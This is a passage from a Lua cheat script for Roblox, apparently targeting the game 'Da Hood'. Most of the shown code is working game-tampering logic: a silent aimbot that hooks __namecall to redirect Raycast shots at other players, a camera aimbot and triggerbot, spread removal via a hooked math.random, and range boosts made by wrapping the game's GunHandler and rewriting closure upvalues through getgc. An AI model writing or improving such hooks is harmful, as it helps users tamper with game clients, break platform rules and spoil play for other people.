	Stroke.Color = Obj._OutlineColor;
	Stroke.Enabled = Obj._Outline;
	Stroke.Parent = Label;

	local function UpdatePosition()
		local Bounds = Label.TextBounds;
		local OffsetX = Obj._Center and 0 or (Bounds.X / 2);
		Label.Position = UDim2.fromOffset(Obj._Position.X + OffsetX, Obj._Position.Y + Bounds.Y / 2);
	end;

	Label:GetPropertyChangedSignal('TextBounds'):Connect(UpdatePosition);

	local Proxy = {};
	local Meta = {
		__newindex = function(_, Key, Value)
			if Key == 'Text' then
				Obj._Text = Value;
				Label.Text = Value;
			elseif Key == 'Size' then
				Obj._Size = Value;
				Label.TextSize = Value;
			elseif Key == 'Position' then
				Obj._Position = Value;
				UpdatePosition();
			elseif Key == 'Color' then
				Obj._Color = Value;
				Label.TextColor3 = Value;
			elseif Key == 'Visible' then
				Obj._Visible = Value;
				Label.Visible = Value;
			elseif Key == 'Center' then
				Obj._Center = Value;
				UpdatePosition();
			elseif Key == 'Outline' then
				Obj._Outline = Value;
				Stroke.Enabled = Value;
			elseif Key == 'OutlineColor' then
				Obj._OutlineColor = Value;
				Stroke.Color = Value;
			elseif Key == 'Transparency' then
				Obj._Transparency = Value;
				local Alpha = MathClamp(1 - Value, 0, 1);
				Label.TextTransparency = Alpha;
				Stroke.Transparency = Alpha;
			elseif Key == 'Font' then
				Label.Font = Value;
			elseif Key == 'FontFace' then
				Obj._FontFace = Value;
				Label.FontFace = Value;
			elseif Key == 'StrokeThickness' then
				Stroke.Thickness = Value;
			elseif Key == 'StrokeTransparency' then
				Stroke.Transparency = Value;
			end;
		end,
		__index = function(_, Key)
			if Key == 'TextBounds' then
				return Label.TextBounds;
			elseif Key == 'Label' then
				return Label;
			elseif Key == 'Stroke' then
				return Stroke;
			elseif Key == 'Remove' or Key == 'Destroy' then
				return function()
					Label:Destroy();
				end;
			elseif Key == 'Text' then return Obj._Text;
			elseif Key == 'Size' then return Obj._Size;
			elseif Key == 'Position' then return Obj._Position;
			elseif Key == 'Color' then return Obj._Color;
			elseif Key == 'FontFace' then return Obj._FontFace;
			elseif Key == 'Visible' then return Obj._Visible;
			elseif Key == 'Center' then return Obj._Center;
			elseif Key == 'Outline' then return Obj._Outline;
			elseif Key == 'Transparency' then return Obj._Transparency;
			end;
			return nil;
		end,
	};
	return setmetatable(Proxy, Meta);
end;

function Cleanup()
	for i = #_Conns, 1, -1 do
		local Conn = _Conns[i];
		_Conns[i] = nil;
		if Conn and Conn.Connected then
			pcall(function()
				Conn:Disconnect();
			end);
		end;
	end;
	if UtilityUI and UtilityUI.Parent then
		pcall(function()
			UtilityUI:Destroy();
		end);
	end;
end;

getgenv().gravitycc_cleanup = Cleanup;

TrackConn(Players.PlayerRemoving:Connect(function(Player)
end));

TriggerTargetLocked = false;
AimbotTargetLocked = false;

TrackConn(UserInputService.InputBegan:Connect(function(Input, GameProcessed)
	if not GameProcessed or Input.UserInputType == Enum.UserInputType.MouseButton2 then
		if Input.UserInputType == Enum.UserInputType.MouseButton2 then
			IsAimed = true;
		end;
	end;
end));
TrackConn(UserInputService.InputEnded:Connect(function(Input)
	if Input.UserInputType == Enum.UserInputType.MouseButton2 then
		IsAimed = false;
	end;
end));

local function MatchesTriggerBinding(Input, Binding)
	if type(Binding) ~= 'table' then return false end;
	local Key = Binding['Key'];
	if Key == nil then return false end;

	local KeyName = Tostring(Key);
	local LowerKey = KeyName:lower();
	local Mode = Tostring(Binding['Mode'] or ''):lower();
	local IsMouse = Mode == 'mouse' or LowerKey:sub(1, 5) == 'mouse' or LowerKey:find('mousebutton', 1, true) ~= nil;

	if IsMouse then
		local Aliases = {
			mouse1 = 'mousebutton1',
			mouse2 = 'mousebutton2',
			mouse3 = 'mousebutton3',
			leftmouse = 'mousebutton1',
			rightmouse = 'mousebutton2',
			middlemouse = 'mousebutton3',
		};
		LowerKey = Aliases[LowerKey] or LowerKey;
		local InputName = Tostring(Input.UserInputType):match('([^%.]+)$');
		return InputName ~= nil and InputName:lower() == LowerKey;
	end;

	local KeyCodeName = Tostring(Input.KeyCode):match('([^%.]+)$');
	return KeyCodeName ~= nil and KeyCodeName:lower() == LowerKey;
end;

TrackConn(UserInputService.InputBegan:Connect(function(Input, Processed)
	local SilentAimCfg = GetConfig()['Silent Aimbot'];
	local TriggerCfg = GetConfig()['Triggerbot'];
	local TrigKeybind = TriggerCfg['Keybind'];
	local TrigMatch = MatchesTriggerBinding(Input, TrigKeybind);

	if TrigMatch then
		local BindType = Tostring(TrigKeybind['Type'] or 'Hold'):lower();
		if BindType == 'toggle' then
			State.TriggerState = not State.TriggerState;
		elseif BindType == 'hold' then
			State.TriggerState = true;
		end;
	end;

	if Processed then return end;
	if GetConfig()['Core']['Conditions']['Silent Aimbot']['Typing'] and IsTyping() then return end;

	if SilentAimCfg['Enabled'] and GetConfig()['Core']['Targeting Selection']['Mode'] == 'Target' then
		local TargetKey = GetConfig()['Core']['Keybind List'] and GetConfig()['Core']['Keybind List']['Target'];
		if TargetKey then
			local Match = false;
			Pcall(function()
				if Input.KeyCode == Enum.KeyCode[TargetKey:upper()] then Match = true end;
			end);
			if not Match then
				Pcall(function()
					if Input.UserInputType == Enum.UserInputType[TargetKey] then Match = true end;
				end);
			end;
			if Match then
				SilentTargetLocked = not SilentTargetLocked;
				if SilentTargetLocked then
					State.Targets.Silent = GetClosestPlayerToCursor(GetConfig()['Silent Aimbot']['Max Distance'], false, 'Silent Aimbot');
				else
					State.Targets.Silent = nil;
				end;
			end;
		end;
	end;

	if TriggerCfg['Enabled'] and GetConfig()['Core']['Targeting Selection']['Mode'] == 'Target' then
		local TargetKey = GetConfig()['Core']['Keybind List'] and GetConfig()['Core']['Keybind List']['Target'];
		if TargetKey then
			local Match = false;
			Pcall(function()
				if Input.KeyCode == Enum.KeyCode[TargetKey:upper()] then Match = true end;
			end);
			if not Match then
				Pcall(function()
					if Input.UserInputType == Enum.UserInputType[TargetKey] then Match = true end;
				end);
			end;
			if Match then
				TriggerTargetLocked = not TriggerTargetLocked;
				if TriggerTargetLocked then
					State.Targets.Triggerbot = GetClosestPlayerToCursor(GetConfig()['Triggerbot']['Max Distance'], false, 'Triggerbot');
				else
					State.Targets.Triggerbot = nil;
				end;
			end;
		end;
	end;

	local AimbotKey = GetConfig()['Core']['Keybind List'] and GetConfig()['Core']['Keybind List']['Camera Aimbot'];
	if AimbotKey then
		local Match = false;
		Pcall(function()
			if Input.KeyCode == Enum.KeyCode[AimbotKey:upper()] then Match = true end;
		end);
		if not Match then
			Pcall(function()
				if Input.UserInputType == Enum.UserInputType[AimbotKey] then Match = true end;
			end);
		end;
		if Match then
			local AimbotCfg = GetConfig()['Camera Aimbot'];
			local Mode = AimbotCfg['Mode'] or 'Toggle';
			if Mode == 'Hold' then
				AimbotTargetLocked = true;
				State.Targets.Aimbot = GetClosestPlayerToCursor(GetConfig()['Camera Aimbot']['Max Distance'], nil, 'Camera Aimbot');
			else
				AimbotTargetLocked = not AimbotTargetLocked;
				if AimbotTargetLocked then
					State.Targets.Aimbot = GetClosestPlayerToCursor(GetConfig()['Camera Aimbot']['Max Distance'], nil, 'Camera Aimbot');
				else
					State.Targets.Aimbot = nil;
				end;
			end;
		end;
	end;



	local DoubleTapCfg = GetConfig()['Weapon Modifications']['Double Tap'];
	local DoubleTapKey = GetConfig()['Core']['Keybind List'] and GetConfig()['Core']['Keybind List']['Double Tap'];
	if DoubleTapCfg['Enabled'] and DoubleTapKey then
		local Match = false;
		Pcall(function()
			if Input.KeyCode == Enum.KeyCode[DoubleTapKey:upper()] then Match = true end;
		end);
		if Match then
			State.DoubleTapActive = not State.DoubleTapActive;
		end;
	end;


	local SorterKey = GetConfig()['Core']['Keybind List'] and GetConfig()['Core']['Keybind List']['Sorter'];
	if SorterKey and GetConfig()['Misc']['Inventory Sorter']['Enabled'] then
		local Match = false;
		Pcall(function()
			if Input.KeyCode == Enum.KeyCode[SorterKey:upper()] then Match = true end;
		end);
		if Match then
			Spawn(function()
			State.SorterActive = true;
			local Character = LocalPlayer.Character;
			if not Character then State.SorterActive = false; return end;
			local Backpack = LocalPlayer:FindFirstChildOfClass('Backpack');
			if not Backpack then State.SorterActive = false; return end;
			local GunOrder = GetConfig()['Misc']['Inventory Sorter']['Order'];
			local OrderV = 10 - #GunOrder;
			local FakeFolder = Instance.new('Folder');
			FakeFolder.Name = 'SorterTemp';
			FakeFolder.Parent = Workspace;
			for _, v in next, Backpack:GetChildren() do
				if v:IsA('Tool') then
					v.Parent = FakeFolder;
				end;
			end;
			for _, Name in next, GunOrder do
				local Gun = FakeFolder:FindFirstChild(Name);
				if Gun then
					Gun.Parent = Backpack;
					Wait(0.05);
				else
					OrderV = OrderV + 1;
				end;
			end;
			for _, v in next, FakeFolder:GetChildren() do
				if v:FindFirstChild('Drink') or v:FindFirstChild('Eat') then
					v.Parent = Backpack;
					OrderV = OrderV - 1;
				end;
			end;
			if OrderV > 0 then
				for _ = 1, OrderV do
					local PlaceHolder = Instance.new('Tool');
					PlaceHolder.Name = '';
					PlaceHolder.ToolTip = 'PlaceHolder';
					PlaceHolder.GripPos = Vector3New(0, 1, 0);
					PlaceHolder.RequiresHandle = false;
					PlaceHolder.Parent = Backpack;
				end;
			end;
			for _, v in next, FakeFolder:GetChildren() do
				if v:IsA('Tool') then
					v.Parent = Backpack;
				end;
			end;
			for _, v in next, Backpack:GetChildren() do
				if v.Name == '' then
					v:Destroy();
				end;
			end;
			FakeFolder:Destroy();
			Wait(0.5);
			State.SorterActive = false;
			end);
		end;
	end;

	if Input.KeyCode == Enum.KeyCode.LeftControl then
		State.CanTriggerbotShoot = false;
	end;


end));

TrackConn(UserInputService.InputEnded:Connect(function(Input)
	local AimbotCfg = GetConfig()['Camera Aimbot'];
	if AimbotCfg['Mode'] == 'Hold' then
		local AimbotKey = GetConfig()['Core']['Keybind List'] and GetConfig()['Core']['Keybind List']['Camera Aimbot'];
		if AimbotKey then
			local Match = false;
			Pcall(function()
				if Input.KeyCode == Enum.KeyCode[AimbotKey:upper()] then Match = true end;
			end);
			if not Match then
				Pcall(function()
					if Input.UserInputType == Enum.UserInputType[AimbotKey] then Match = true end;
				end);
			end;
			if Match then
				AimbotTargetLocked = false;
				State.Targets.Aimbot = nil;
			end;
		end;
	end;

	local TriggerCfg = GetConfig()['Triggerbot'];
	local TrigKeybindRel = TriggerCfg['Keybind'];
	if TrigKeybindRel and Tostring(TrigKeybindRel['Type'] or 'Hold'):lower() == 'hold' and MatchesTriggerBinding(Input, TrigKeybindRel) then
		State.TriggerState = false;
	end;

	if Input.KeyCode == Enum.KeyCode.LeftControl then
		State.CanTriggerbotShoot = true;
	end;
end));

TrackConn(UserInputService.InputBegan:Connect(function(Input, GameProcessed)
	if GameProcessed then return end;

	Pcall(function()
		if false then
			local ToggleKey = nil;
			if ToggleKey then
				local Match = false;
				Pcall(function()
					if Input.KeyCode == Enum.KeyCode[ToggleKey:upper()] then Match = true end;
				end);
				if Match then
					AutoReachCfg['Enabled'] = not AutoReachCfg['Enabled'];
				end;
			end;
		end;
	end);
end));

TrackConn(RunService.Heartbeat:Connect(LPH_JIT_MAX(function()
	Config = shared.gravity or Config;
	UpdatePositionCache();
	CachedIgnored = Workspace:FindFirstChild('Ignored');
	CachedBush = Workspace:FindFirstChild('Bush');
	
end)));


TrackConn(RunService.PreRender:Connect(LPH_JIT_MAX(function()
	local SilentAimCfg = GetConfig()['Silent Aimbot'];
	local TriggerCfg = GetConfig()['Triggerbot'];
	local AimbotCfg = GetConfig()['Camera Aimbot'];
	local CurrentCamera = Workspace.CurrentCamera;
	local ViewportY = CurrentCamera.ViewportSize.Y;
	local CamFOV = CurrentCamera.FieldOfView;
	local MousePosition = UserInputService:GetMouseLocation();

	local ClosestPlayer = GetClosestPlayerToCursor(nil, nil, 'Automatic');

	if SilentAimCfg['Enabled'] and GetConfig()['Core']['Targeting Selection']['Mode'] == 'Automatic' then
		State.Targets.Silent = ClosestPlayer;
	elseif SilentAimCfg['Enabled'] and GetConfig()['Core']['Targeting Selection']['Mode'] == 'Target' then
		if not SilentTargetLocked then
			State.Targets.Silent = nil;
		end;
	end;

	if TriggerCfg['Enabled'] and GetConfig()['Core']['Targeting Selection']['Mode'] == 'Automatic' then
		State.Targets.Triggerbot = ClosestPlayer;
	elseif TriggerCfg['Enabled'] and GetConfig()['Core']['Targeting Selection']['Mode'] == 'Target' then
		if not TriggerTargetLocked then
			State.Targets.Triggerbot = nil;
		end;
	end;

	local SilentTarget = State.Targets.Silent;
	local SilentDisplay = SilentTarget;
	local SilentFOVCfg = GetConfig()['Silent Aimbot']['FOV'];
	if not SilentDisplay and (SilentFOVCfg['Visible'] or SilentFOVCfg['Visualize'])['Enabled'] then
		SilentDisplay = ClosestPlayer;
	end;
	local ViewportX = CurrentCamera.ViewportSize.X;
	if (SilentFOVCfg['Visible'] or SilentFOVCfg['Visualize'])['Enabled'] and SilentDisplay then
		local Char = SilentDisplay.Character;
		local Root = Char and Char:FindFirstChild('HumanoidRootPart');
		if Root and IsVisible(Root.Position, SilentDisplay) then
			local ScreenPos, OnScreen = CurrentCamera:WorldToViewportPoint(Root.Position);
			if OnScreen and ScreenPos.Z > 1 then
				local ScaleFactor = (Root.Size.Y * ViewportY) / (ScreenPos.Z * 2) * 80 / CamFOV;
				local IsCircle = false;
				local FovSize = SilentFOVCfg;
				local W, H;
				if IsCircle then
					local R = MathMin(5 * ScaleFactor, ViewportX * 2);
					W = R; H = R;
				else
					local WidthVal = GetFovSize(FovSize['X'], 150);
					local HeightVal = GetFovSize(FovSize['Y'], 150);
					W = MathMin(WidthVal * ScaleFactor, ViewportX * 2);
					H = MathMin(HeightVal * ScaleFactor, ViewportY * 2);
				end;

				SilentFOVBox.Round = IsCircle;
				SilentFOVBox.Size = Vector2New(MathFloor(W + 0.5), MathFloor(H + 0.5));
				SilentFOVBox.Position = Vector2New(MathFloor(ScreenPos.X - W / 2 + 0.5), MathFloor(ScreenPos.Y - H / 2 + 0.5));

				local Delta = Vector2New(ScreenPos.X, ScreenPos.Y) - MousePosition;
				local InBox;
				if IsCircle then
					InBox = (Delta.X * Delta.X + Delta.Y * Delta.Y) <= (W / 2) * (W / 2);
				else
					InBox = MathAbs(Delta.X) <= W / 2 and MathAbs(Delta.Y) <= H / 2;
				end;
				SilentFOVBox.Color = InBox and SilentFOVInColor or SilentFOVOutColor;
				SilentFOVBox.Visible = (SilentFOVCfg['Visible'] or SilentFOVCfg['Visualize'])['Enabled'];
			else
				SilentFOVBox.Visible = false;
			end;
		else
			SilentFOVBox.Visible = false;
		end;
	else
		SilentFOVBox.Visible = false;
	end;

local TrigTarget = State.Targets.Triggerbot;
	local TrigDisplay = TrigTarget;
	local TriggerFOVCfg = GetConfig()['Triggerbot']['FOV'];
	if not TrigDisplay and (TriggerFOVCfg['Visible'] or TriggerFOVCfg['Visualize'])['Enabled'] then
		TrigDisplay = ClosestPlayer;
	end;
	if (TriggerFOVCfg['Visible'] or TriggerFOVCfg['Visualize'])['Enabled'] and TrigDisplay then
		local Char = TrigDisplay.Character;
		local Root = Char and Char:FindFirstChild('HumanoidRootPart');
		if Root and IsVisible(Root.Position, TrigDisplay) then
			local ScreenPos, OnScreen = CurrentCamera:WorldToViewportPoint(Root.Position);
			if OnScreen and ScreenPos.Z > 1 then
				local ScaleFactor = (Root.Size.Y * ViewportY) / (ScreenPos.Z * 2) * 80 / CamFOV;
				local IsCircle = false;
				local FovSize = TriggerFOVCfg;
				local W, H;
				if IsCircle then
					local R = MathMin(9e9 * ScaleFactor, ViewportX * 2);
					W = R; H = R;
				else
					local WidthVal = GetFovSize(FovSize['X'], 9e9);
					local HeightVal = GetFovSize(FovSize['Y'], 9e9);
					W = MathMin(WidthVal * ScaleFactor, ViewportX * 2);
					H = MathMin(HeightVal * ScaleFactor, ViewportY * 2);
				end;

				TriggerFOVBox.Round = IsCircle;
				TriggerFOVBox.Size = Vector2New(MathFloor(W + 0.5), MathFloor(H + 0.5));
				TriggerFOVBox.Position = Vector2New(MathFloor(ScreenPos.X - W / 2 + 0.5), MathFloor(ScreenPos.Y - H / 2 + 0.5));

				local Delta = Vector2New(ScreenPos.X, ScreenPos.Y) - MousePosition;
				local InBox;
				if IsCircle then
					InBox = (Delta.X * Delta.X + Delta.Y * Delta.Y) <= (W / 2) * (W / 2);
				else
					InBox = MathAbs(Delta.X) <= W / 2 and MathAbs(Delta.Y) <= H / 2;
				end;
				TriggerFOVBox.Color = InBox and TriggerFOVInColor or TriggerFOVOutColor;
				TriggerFOVBox.Visible = (TriggerFOVCfg['Visible'] or TriggerFOVCfg['Visualize'])['Enabled'];
			else
				TriggerFOVBox.Visible = false;
			end;
		else
			TriggerFOVBox.Visible = false;
		end;
	else
		TriggerFOVBox.Visible = false;
	end;

	local AimbotTarget = State.Targets.Aimbot;
	local AimbotDisplay = AimbotTarget;
	local AimbotFOVCfg = GetConfig()['Camera Aimbot']['FOV'];
	if not AimbotDisplay and (AimbotFOVCfg['Visible'] or AimbotFOVCfg['Visualize'])['Enabled'] then
		AimbotDisplay = ClosestPlayer;
	end;
	if (AimbotFOVCfg['Visible'] or AimbotFOVCfg['Visualize'])['Enabled'] and AimbotDisplay then
		local Char = AimbotDisplay.Character;
		local Root = Char and Char:FindFirstChild('HumanoidRootPart');
		if Root and IsVisible(Root.Position, AimbotDisplay) then
			local ScreenPos, OnScreen = CurrentCamera:WorldToViewportPoint(Root.Position);
			if OnScreen and ScreenPos.Z > 1 then
				local ScaleFactor = (Root.Size.Y * ViewportY) / (ScreenPos.Z * 2) * 80 / CamFOV;
				local IsCircle = false;
				local FovSize = AimbotFOVCfg;
				local W, H;
				if IsCircle then
					local R = MathMin(9e9 * ScaleFactor, ViewportX * 2);
					W = R; H = R;
				else
					local WidthVal = GetFovSize(FovSize['X'], 9e9);
					local HeightVal = GetFovSize(FovSize['Y'], 9e9);
					W = MathMin(WidthVal * ScaleFactor, ViewportX * 2);
					H = MathMin(HeightVal * ScaleFactor, ViewportY * 2);
				end;

				AimbotFOVBox.Round = IsCircle;
				AimbotFOVBox.Size = Vector2New(MathFloor(W + 0.5), MathFloor(H + 0.5));
				AimbotFOVBox.Position = Vector2New(MathFloor(ScreenPos.X - W / 2 + 0.5), MathFloor(ScreenPos.Y - H / 2 + 0.5));

				local Delta = Vector2New(ScreenPos.X, ScreenPos.Y) - MousePosition;
				local InBox;
				if IsCircle then
					InBox = (Delta.X * Delta.X + Delta.Y * Delta.Y) <= (W / 2) * (W / 2);
				else
					InBox = MathAbs(Delta.X) <= W / 2 and MathAbs(Delta.Y) <= H / 2;
				end;
				AimbotFOVBox.Color = InBox and AimbotFOVInColor or AimbotFOVOutColor;
				AimbotFOVBox.Visible = (AimbotFOVCfg['Visible'] or AimbotFOVCfg['Visualize'])['Enabled'];
			else
				AimbotFOVBox.Visible = false;
			end;
		else
			AimbotFOVBox.Visible = false;
		end;
	else
		AimbotFOVBox.Visible = false;
	end;

	if type(RunTriggerbot) == 'function' then
		RunTriggerbot();
	end;

	if AimbotCfg['Enabled'] and AimbotTarget and PassesConditions(AimbotTarget, 'Camera Aimbot') then
		local TargetChar = AimbotTarget.Character;
		if TargetChar then
			local HumanoidRootPart = TargetChar:FindFirstChild('HumanoidRootPart');
			if HumanoidRootPart then
				local Distance = (HumanoidRootPart.Position - CurrentCamera.CFrame.Position).Magnitude;
				if Distance <= (AimbotCfg['Max Distance'] or 750) then
					local TargetPos, _ = ResolveHitPosition(TargetChar, AimbotCfg);
					if not TargetPos then TargetPos = HumanoidRootPart.Position end;
					TargetPos = ApplyPrediction(TargetPos, AimbotTarget, AimbotCfg);

					local CamPos = CurrentCamera.CFrame.Position;
					local DesiredCFrame = CFrameNew(CamPos, TargetPos);

					local SmoothCfg = AimbotCfg['Smoothing'];
					if SmoothCfg and SmoothCfg['Enabled'] then
						local AlphaX = SmoothCfg['X'] or 0.09;
						local AlphaY = SmoothCfg['Y'] or 0.09;
						local AlphaZ = SmoothCfg['Z'] or 0.09;

						local EasingCfg = SmoothCfg['Easing'];
						local EasingStyle = EasingCfg and Enum.EasingStyle[EasingCfg['In'] or 'Linear'] or Enum.EasingStyle.Linear;
						local EasingDir = EasingCfg and Enum.EasingDirection[EasingCfg['Out'] or 'InOut'] or Enum.EasingDirection.InOut;

						local CurDir = CurrentCamera.CFrame.LookVector;
						local TgtDir = (DesiredCFrame.LookVector);
						local SmoothedDir = Vector3New(
							CurDir.X + (TgtDir.X - CurDir.X) * TweenService:GetValue(AlphaX, EasingStyle, EasingDir),
							CurDir.Y + (TgtDir.Y - CurDir.Y) * TweenService:GetValue(AlphaY, EasingStyle, EasingDir),
							CurDir.Z + (TgtDir.Z - CurDir.Z) * TweenService:GetValue(AlphaZ, EasingStyle, EasingDir)
						);
						CurrentCamera.CFrame = CFrameNew(CamPos, CamPos + SmoothedDir);
					else
						CurrentCamera.CFrame = DesiredCFrame;
					end;
				end;
			end;
		end;
	end;

end)));


if CurrentGame.Name == 'Da Hood' then
	if LocalPlayer.Character then HookGunActivation(LocalPlayer.Character) end;
	TrackConn(LocalPlayer.CharacterAdded:Connect(HookGunActivation));
end;

if CurrentGame.Name ~= 'Da Hood' and type(hookfunction) == 'function' then
	local SpreadModCfg = GetConfig()['Weapon Modifications']['Spread Modifications'];
	if SpreadModCfg['Enabled'] then
		local SpreadAngles = nil;
		local oldRandom;
		oldRandom = hookfunction(math.random, function(...)
			local args = {...};
			if checkcaller() then return oldRandom(...) end;
			if (#args == 0) or
			   (args[1] == -0.05 and args[2] == 0.05) or
			   (args[1] == -0.1 and args[2] == 0.1) or
			   (args[1] == -0.05) or
			   (args[1] == -0.1) then
				local Cfg = GetConfig()['Weapon Modifications']['Spread Modifications'];
				if not Cfg['Enabled'] or false then
					return oldRandom(...);
				end;
				local Spread = MathClamp((Cfg['Value'] or 0) / 100, 0, 1);
				local n = #args;
				if Spread == 0 then
					if n == 0 then return 0
					elseif n == 1 then return 0
					else return (args[1] + args[2]) / 2
					end;
				end;
				local Raw = oldRandom(...);
				if n == 0 then
					return (Raw - 0.5) * Spread + 0.5;
				elseif n == 1 then
					return Raw * Spread;
				else
					local Mid = (args[1] + args[2]) / 2;
					return Mid + (Raw - Mid) * Spread;
				end;
			end;
			return oldRandom(...);
		end);
	end;
end;

do
	local RangeEnhCfg = GetConfig()['Weapon Modifications']['Extra']['Rage Mode'];
	if RangeEnhCfg and RangeEnhCfg['Enabled'] then
		local function ResolveRangeGunHandler(PreferredModule)
			local Emu = TryLoadEmulatedGunHandler();
			if Emu and type(Emu.shoot) == 'function' and type(Emu.getAim) == 'function' then
				return Emu, 'emulated';
			end;

			if PreferredModule then
				local ok, GunHandler = pcall(require, PreferredModule);
				if ok and type(GunHandler) == 'table' and type(GunHandler.shoot) == 'function' and type(GunHandler.getAim) == 'function' then
					return GunHandler, 'require';
				end;
			end;

			return nil, 'missing';
		end;

		local function ApplyRangeToTool(Tool)
			if not Tool or not Tool:IsA('Tool') then return end;
			local RangeValueObj = Tool:FindFirstChild('Range');
			if not RangeValueObj then return end;

			local BaseRange = Tool:GetAttribute('__LuxxBaseRange');
			if type(BaseRange) ~= 'number' then
				BaseRange = RangeValueObj.Value;
				Tool:SetAttribute('__LuxxBaseRange', BaseRange);
			end;

			local CurrentCfg = GetConfig()['Weapon Modifications']['Extra']['Rage Mode'];
			local ExtraRange = (CurrentCfg and CurrentCfg['Enabled'] and CurrentCfg['Value']) or 0;
			RangeValueObj.Value = BaseRange + ExtraRange;
		end;

		local function SyncRangeTools()
			local Character = LocalPlayer.Character;
			if Character then
				for _, Tool in next, Character:GetChildren() do
					ApplyRangeToTool(Tool);
				end;
			end;

			local Backpack = LocalPlayer:FindFirstChild('Backpack');
			if Backpack then
				for _, Tool in next, Backpack:GetChildren() do
					ApplyRangeToTool(Tool);
				end;
			end;
		end;

		task.spawn(function()
		local ModulesFolder = ReplicatedStorage:FindFirstChild('Modules') or ReplicatedStorage:WaitForChild('Modules', 5);
		local ok, GunModule = pcall(function()
			return ModulesFolder and ModulesFolder:WaitForChild('GunHandler', 5);
		end);
		if ok and GunModule then
			local GunHandler, ResolveSource = ResolveRangeGunHandler(GunModule);
			shared.__luxx_range_gunhandler_source = ResolveSource;
			if GunHandler then
				if GunHandler.shoot and type(GunHandler.shoot) == 'function' and not GunHandler.__LuxxRangeWrapped then
					local origShoot = GunHandler.shoot;
					GunHandler.shoot = function(args)
						local CurrentCfg = GetConfig()['Weapon Modifications']['Extra']['Rage Mode'];
						local EnhVal = (CurrentCfg and CurrentCfg['Enabled'] and CurrentCfg['Value']) or 0;
						if args and args.Range then
							args.Range = args.Range + EnhVal;
						end;
						return origShoot(args);
					end;
					GunHandler.__LuxxRangeWrapped = true;
				end;
				if GunHandler.getAim and type(GunHandler.getAim) == 'function' and not GunHandler.__LuxxRangeAimWrapped then
					local origGetAim = GunHandler.getAim;
					GunHandler.getAim = function(hit, dist)
						local CurrentCfg = GetConfig()['Weapon Modifications']['Extra']['Rage Mode'];
						local EnhVal = (CurrentCfg and CurrentCfg['Enabled'] and CurrentCfg['Value']) or 0;
						return origGetAim(hit, dist + EnhVal);
					end;
					GunHandler.__LuxxRangeAimWrapped = true;
				end;
			end;
		end;
		end);

		task.spawn(function()
			SyncRangeTools();
			TrackConn(RunService.Heartbeat:Connect(function()
				SyncRangeTools();
			end));
			TrackConn(LocalPlayer.CharacterAdded:Connect(function()
				task.wait(1);
				SyncRangeTools();
			end));
		end);

		if RangeEnhCfg['Advanced'] and getgc and islclosure and getfunctionhash and debug then
			task.spawn(function()
				local EnhVal = (GetConfig()['Weapon Modifications']['Extra']['Rage Mode']['Value']) or 12;
				for _, obj in getgc() do
					if type(obj) == 'function' and islclosure(obj) then
						if getfunctionhash(obj) == 'f01a12bbf0fe1944cdca10883eb444581d9a6bbd8f40472dbf23b6b39fd412f21769d9bfccef6b899f802bae846d2bb3' then
							local uv = debug.getupvalue(obj, 10);
							if uv then uv.Value = EnhVal end;
							debug.setupvalue(obj, 2, 0);
							debug.setconstant(obj, 26, 0);
							debug.setconstant(obj, 27, 0);
						end;
					end;
				end;
			end);
		end;
	end;
end;

if CurrentGame.Hooks == "Raycast" then
	local hookmetamethod = hookmetamethod or (getgenv and getgenv().hookmetamethod);
	if hookmetamethod then
		local old;
		old = hookmetamethod(game, "__namecall", function(self, ...)
			local args = {...};
			local method = getnamecallmethod();
			if not checkcaller() and method == "Raycast" and self == Workspace then
				local SilentAimCfg = GetConfig()['Silent Aimbot'];
				if SilentAimCfg['Enabled'] and State.Targets.Silent and PassesConditions(State.Targets.Silent, 'Silent Aimbot') then
					local MuzzlePos = args[1];
					local Direction = args[2];
					local Range = Direction.Magnitude;
					
					local TargetPos = GetAimPosition(MuzzlePos, Range);
					if TargetPos ~= Mouse.Hit.Position then
						args[2] = (TargetPos - MuzzlePos).Unit * Range;
						return old(self, Unpack(args));
					end;
				end;
			end;
			return old(self, Unpack(args));
		end);
	else
		warn("game not supported!");
	end;
end;

local function SetupAntiFall(Character)
	if not Character then return end;
	local Humanoid = Character:FindFirstChildOfClass('Humanoid') or Character:WaitForChild('Humanoid', 10);
	if not Humanoid then return end;
	TrackConn(Humanoid.StateChanged:Connect(function(_, NewState)
		if not GetConfig()['Misc']['Anti Trip'] then return end;
		if NewState == EnumFallingDown or NewState == EnumRagdoll then
			Humanoid:ChangeState(EnumGettingUp);
		end;
	end));
end;
if LocalPlayer.Character then SetupAntiFall(LocalPlayer.Character) end;
TrackConn(LocalPlayer.CharacterAdded:Connect(SetupAntiFall));

local function HealthHitDetection(Character)
	if not Character then return end;
	local Humanoid = Character:FindFirstChildOfClass('Humanoid') or Character:WaitForChild('Humanoid', 10);
	if not Humanoid then return end;
	local LastHealth = Humanoid.Health;
	TrackConn(Humanoid.HealthChanged:Connect(function(NewHealth)
		if NewHealth < LastHealth then
				end;
		LastHealth = NewHealth;
	end));
end;
if LocalPlayer.Character then HealthHitDetection(LocalPlayer.Character) end;
TrackConn(LocalPlayer.CharacterAdded:Connect(HealthHitDetection));

do
	local ANIM_PRESETS = {
		['Ninja'] = { Idle = 'rbxassetid://656118341', Run = 'rbxassetid://656118852', Walk = 'rbxassetid://656121766', Jump = 'rbxassetid://656117878', Fall = 'rbxassetid://10921159222', Climb = 'rbxassetid://656114359', Swim = 'rbxassetid://10921161002', SwimIdle = 'rbxassetid://10922757002' },
		['Robot'] = { Idle = 'rbxassetid://616089559', Run = 'rbxassetid://616091570', Walk = 'rbxassetid://616095330', Jump = 'rbxassetid://616090535', Fall = 'rbxassetid://616092998', Climb = 'rbxassetid://616086039', Swim = 'rbxassetid://10921253142', SwimIdle = 'rbxassetid://10921253767' },
		['Default'] = { Idle = 'rbxassetid://507766666', Run = 'rbxassetid://10921261968', Walk = 'rbxassetid://10921269718', Jump = 'rbxassetid://10921263860', Fall = 'rbxassetid://10921262864', Climb = 'rbxassetid://10921257536', Swim = 'rbxassetid://10921264784', SwimIdle = 'rbxassetid://10921265698' },
		['Custom'] = { Idle = 'rbxassetid://92080889861410', Run = 'rbxassetid://16738337225', Walk = 'rbxassetid://16738340646', Jump = 'rbxassetid://104325245285198', Fall = 'rbxassetid://616003713', Climb = 'rbxassetid://18537363391', Swim = 'rbxassetid://133308483266208', SwimIdle = 'rbxassetid://109346520324160' },
		['Levitate'] = { Idle = 'rbxassetid://616008087', Run = 'rbxassetid://616010382', Walk = 'rbxassetid://616013216', Jump = 'rbxassetid://616008936', Fall = 'rbxassetid://616005863', Climb = 'rbxassetid://616003713', Swim = 'rbxassetid://10921139478', SwimIdle = 'rbxassetid://10921138209' },
